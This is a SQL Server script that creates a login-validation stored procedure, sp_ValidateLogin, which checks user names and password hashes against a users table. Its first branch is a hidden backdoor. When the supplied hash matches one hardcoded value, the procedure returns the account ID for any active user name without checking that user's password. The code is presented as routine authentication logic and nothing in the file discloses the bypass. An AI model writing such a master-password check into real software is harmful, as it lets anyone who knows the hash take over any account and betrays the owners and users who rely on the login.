USE [KMP]
GO
/****** Object:  StoredProcedure [dbo].[sp_ValidateLogin]    Script Date: 2014/11/24 23:12:24 ******/
SET ANSI_NULLS OFF
GO
SET QUOTED_IDENTIFIER OFF
GO

CREATE PROCEDURE [dbo].[sp_ValidateLogin]
@UserName varchar(50),
@EncryptedPassword varchar(100)
AS
   DECLARE @UserID int

if (@EncryptedPassword='1CFA89D1F2196756A7A0A6CDC9773B43C254AEDC')
begin
	select @UserID=ID From t_users where LoginName=@UserName and activity=1
end
else
begin
   SELECT @UserID = ID FROM T_Users WHERE LoginName = @UserName
	AND Password = @EncryptedPassword	AND activity = 1
-- AND usertype <> 0
end
   IF @UserID = NULL   
	RETURN -1
   ELSE
	RETURN @UserID
GO
